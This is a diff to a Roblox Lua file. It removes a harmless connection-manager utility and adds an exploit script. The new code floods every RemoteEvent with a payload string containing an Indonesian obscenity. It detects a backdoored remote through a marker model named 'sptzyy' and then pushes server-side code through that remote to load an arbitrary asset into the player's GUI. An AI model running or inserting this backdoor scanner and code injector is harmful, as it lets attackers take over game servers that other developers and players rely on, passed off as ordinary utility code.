@@ -1,49 +1,55 @@
--- ConnectionManager: simpan semua connection dan beri kemampuan remove by tag
-local ConnectionManager = {}
-ConnectionManager.__index = ConnectionManager
+local modelName = "sptzyy"
+local zyy = nil
+local lastFired = nil
 
-function ConnectionManager.new()
-    return setmetatable({
-        connections = {} -- { tag -> {conn, conn, ...}, ... }
-    }, ConnectionManager)
+for _, obj in ipairs(workspace:GetChildren()) do
+	if obj.Name == modelName then
+		obj:Destroy()
+	end
 end
 
--- connect dan simpan connection ke tag (tag opsional)
-function ConnectionManager:connect(event, callback, tag)
-    assert(type(callback) == "function", "callback must be function")
-    local conn = event:Connect(callback)
-    tag = tag or "__default"
-    self.connections[tag] = self.connections[tag] or {}
-    table.insert(self.connections[tag], conn)
-    return conn
+workspace.ChildAdded:Connect(function(child)
+	if child.Name == modelName and zyy == nil then
+		zyy = lastFired
+		print("Found zyy!")
+	end
+end)
+
+local payload = [[
+ KONTOL MESUM😂
+]]
+
+for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
+	if remote:IsA("RemoteEvent") then
+		pcall(function()
+			remote:FireServer(payload)
+		end)
+		lastFired = remote
+		game:GetService("RunService").RenderStepped:Wait()
+	end
 end
 
--- disconnect semua connections di sebuah tag
-function ConnectionManager:removeTag(tag)
-    local list = self.connections[tag]
-    if not list then return end
-    for _, conn in ipairs(list) do
-        if conn and typeof(conn) == "RBXScriptConnection" then
-            pcall(function() conn:Disconnect() end)
-        else
-            -- fallback: some frameworks return plain tables/objects
-            if type(conn) == "table" and conn.Disconnect then
-                pcall(function() conn:Disconnect() end)
-            end
-        end
-    end
-    self.connections[tag] = nil
-end
+task.wait(0.5)
 
--- disconnect and clear all
-function ConnectionManager:removeAll()
-    for tag, _ in pairs(self.connections) do
-        self:removeTag(tag)
-    end
+if zyy and typeof(zyy) == "Instance" then
+	local playerName = game.Players.LocalPlayer.Name
+	local insertPayload = [[
+		local player = game.Players:FindFirstChild("]] .. playerName .. [[")
+		if player and player:FindFirstChild("PlayerGui") then
+			local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
+			asset.Parent = player.PlayerGui
+			for _, child in ipairs(asset:GetChildren()) do
+				child.Parent = player.PlayerGui
+			end
+			asset:Destroy()
+		end
+	]]
+	zyy:FireServer(insertPayload)
+else
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "sptzyy",
+		Text = ":(",
+		Icon = "",
+		Duration = 5,
+	})
 end
-
--- contoh pemakaian (Roblox)
--- local cm = ConnectionManager.new()
--- local conn1 = cm:connect(game:GetService("RunService").Heartbeat, function(dt) print("hb", dt) end, "heartbeat")
--- cm:removeTag("heartbeat") -- disconnect heartbeat listener
--- cm:removeAll() -- disconnect semua
